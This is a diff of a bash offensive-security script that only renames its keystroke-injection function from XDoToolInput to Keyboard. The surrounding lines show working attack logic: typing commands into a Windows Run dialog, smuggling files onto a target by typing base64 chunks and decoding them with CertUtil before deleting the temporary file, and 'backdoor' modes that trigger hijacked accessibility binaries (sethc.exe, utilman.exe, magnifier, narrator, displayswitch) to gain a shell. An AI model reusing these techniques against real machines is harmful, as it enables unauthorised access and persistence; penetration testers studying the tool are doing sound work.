@@ -40,7 +40,7 @@ function print_status() {
     echo -e "${color} ${message}"
 }
 
-function XDoToolInput() {
+function Keyboard() {
     local input="${1}"
     local key="${2}"
 
@@ -106,11 +106,11 @@ function CmdFile() {
     if [[ ${number_of_lines} -eq 0 ]]
     then
 	    read contents < "${file}"
-	    XDoToolInput "${contents}" "escapechars"
+	    Keyboard "${contents}" "escapechars"
 	else
         while read -r line
         do
-            XDoToolInput "${line}" "escapechars"
+            Keyboard "${line}" "escapechars"
         done < "${file}"
     fi
     print_status "completed" "Task completed!"
@@ -123,7 +123,7 @@ function Execute() {
     case "${method}" in
         none)
             print_status "progress" "Executing commands..."
-            XDoToolInput "${commands}" "escapechars"
+            Keyboard "${commands}" "escapechars"
             print_status "completed" "Task completed!"
             ;;
         dialogbox)
@@ -150,8 +150,8 @@ function DialogBox() {
     fi
 
     print_status "progress" "Executing commands..."
-    XDoToolInput "Super+r" "customkey"
-    XDoToolInput "${commands}" "escapechars"
+    Keyboard "Super+r" "customkey"
+    Keyboard "${commands}" "escapechars"
     print_status "completed" "Task completed!"
 }
 
@@ -249,14 +249,14 @@ function Base64() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                XDoToolInput "\$${random_1} = \"${data:i:chunks}\"" "return"
+                Keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
             else
-                XDoToolInput "\$${random_1} += \"${data:i:chunks}\"" "return"
+                Keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
             fi
         done
 
-        XDoToolInput "[byte[]]\$${random_2} = [Convert]::FromBase64String(\$${random_1})" "return"
-        XDoToolInput "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_2})" "return"
+        Keyboard "[byte[]]\$${random_2} = [Convert]::FromBase64String(\$${random_1})" "return"
+        Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_2})" "return"
 
         print_status "completed" "File transferred!"
     elif [[ "${platform}" = "linux" && "${mode}" = "console" ]]
@@ -267,13 +267,13 @@ function Base64() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                XDoToolInput "${random_1}=\"${data:i:chunks}\"" "return"
+                Keyboard "${random_1}=\"${data:i:chunks}\"" "return"
             else
-                XDoToolInput "${random_1}+=\"${data:i:chunks}\"" "return"
+                Keyboard "${random_1}+=\"${data:i:chunks}\"" "return"
             fi
         done
 
-        XDoToolInput "base64 -d <<< \$${random_1} > \"${output_file}\"" "return"
+        Keyboard "base64 -d <<< \$${random_1} > \"${output_file}\"" "return"
         print_status "completed" "File transferred!"
     fi
 }
@@ -381,13 +381,13 @@ function PowershellOutFile() {
                 done < "${input}"
 
                 print_status "progress" "Transferring file..."
-                XDoToolInput "@'" "escapechars"
+                Keyboard "@'" "escapechars"
                 while read -r line
                 do
-                    XDoToolInput "${line}" "return"
+                    Keyboard "${line}" "return"
                 done < "${input}"
 
-                XDoToolInput "'@ | Out-File ${output_file}" "escapechars"
+                Keyboard "'@ | Out-File ${output_file}" "escapechars"
             elif [[ "${file_type}" == "binary" ]]
             then
                 print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
@@ -410,24 +410,24 @@ function PowershellOutFile() {
 
             print_status "progress" "Transferring file..."
             data=$(basenc -w 0 --base64 "${input}")
-            XDoToolInput "@'" "escapechars"
-            XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
+            Keyboard "@'" "escapechars"
+            Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
 
 	        for (( i=0; i<${#data}; i+=chunks ))
 	        do
 	            if [[ ${i} -eq 0 ]]
 	            then
-	                    XDoToolInput "${data:i:chunks}" "return"
+	                    Keyboard "${data:i:chunks}" "return"
 	            else
-                        XDoToolInput "${data:i:chunks}" "return"
+                        Keyboard "${data:i:chunks}" "return"
 	            fi
 	        done
 
-            XDoToolInput "-----END CERTIFICATE-----" "escapechars"
-            XDoToolInput "'@ | Out-File ${random_temp}.txt" "escapechars"
-            XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
+            Keyboard "-----END CERTIFICATE-----" "escapechars"
+            Keyboard "'@ | Out-File ${random_temp}.txt" "escapechars"
+            Keyboard "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
 
-            XDoToolInput "Remove-Item -Force ${random_temp}.txt" "return"
+            Keyboard "Remove-Item -Force ${random_temp}.txt" "return"
         elif [[ "${mode}" = "hex" ]]
         then
             data=$(basenc -w 0 --base16 "${input}")
@@ -481,16 +481,16 @@ function CopyCon() {
         done < "${input}"
 
         print_status "progress" "Transferring file..."
-        XDoToolInput "copy con ${output_file}" "return"
+        Keyboard "copy con ${output_file}" "return"
 
         counter=1
         while read -r line
         do
             if [[ "${counter}" != "${number_of_lines}" ]]
             then
-                XDoToolInput "${line}" "return"
+                Keyboard "${line}" "return"
             else
-                XDoToolInput "${line}" "copycon"
+                Keyboard "${line}" "copycon"
             fi
             ((counter++))
         done < "${input}"
@@ -508,22 +508,22 @@ function CopyCon() {
         fi
 
         print_status "progress" "Transferring file..."
-        XDoToolInput "copy con ${random_temp}.txt" "return"
-        XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
+        Keyboard "copy con ${random_temp}.txt" "return"
+        Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
 
         for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ ${i} -eq 0 ]]
             then
-                XDoToolInput "${data:i:chunks}" "return"
+                Keyboard "${data:i:chunks}" "return"
             else
-                XDoToolInput "${data:i:chunks}" "return"
+                Keyboard "${data:i:chunks}" "return"
             fi
         done
 
-        XDoToolInput "-----END CERTIFICATE-----" "copycon"
-        XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
-        XDoToolInput "del /f ${random_temp}.txt" "return"
+        Keyboard "-----END CERTIFICATE-----" "copycon"
+        Keyboard "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
+        Keyboard "del /f ${random_temp}.txt" "return"
     elif [[ "${mode}" = "hex" ]]
     then
         data=$(basenc -w 0 --base16 "${input}")
@@ -588,7 +588,7 @@ EndOfText
     elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
-        XDoToolInput "shift shift shift shift shift" "customkey"
+        Keyboard "shift shift shift shift shift" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -616,7 +616,7 @@ EndOfText
     elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        XDoToolInput "Super+u" "customkey"
+        Keyboard "Super+u" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -644,8 +644,8 @@ EndOfText
     elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
-        XDoToolInput "Super+equal" "customkey"
-        XDoToolInput "Super+minus" "customkey"
+        Keyboard "Super+equal" "customkey"
+        Keyboard "Super+minus" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -673,7 +673,7 @@ EndOfText
     elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
-        XDoToolInput "Super+Return" "customkey"
+        Keyboard "Super+Return" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -701,7 +701,7 @@ EndOfText
     elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
-        XDoToolInput "Super+p" "customkey"
+        Keyboard "Super+p" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
